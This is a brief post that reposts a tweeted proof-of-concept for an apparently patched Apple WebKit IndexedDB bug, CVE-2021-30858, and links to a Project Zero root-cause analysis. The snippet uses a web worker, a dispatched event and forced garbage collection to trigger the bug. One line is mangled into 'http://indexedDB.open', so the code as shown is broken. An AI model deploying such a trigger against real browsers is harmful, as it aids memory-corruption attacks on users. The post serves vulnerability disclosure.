---
title: Apple's IndexDB Has A Tweetable Exploit
repost_link: https://googleprojectzero.github.io/0days-in-the-wild/0day-RCAs/2021/CVE-2021-30858.html
---

By [@maddiestone](https://twitter.com/maddiestone/status/1486402800103792645?s=21):

```js
index.html:
<script>w = new Worker('idbworker.js');</script>

idbworker.js:
function gc() {
   for (var i = 0; i < 1000; i++) { a = new Uint8Array(1024*1024); }
}

let ev = new Event('mine');
let req = http://indexedDB.open('db');
req.dispatchEvent(ev);
req = 0;
ev = 0;
gc();
```
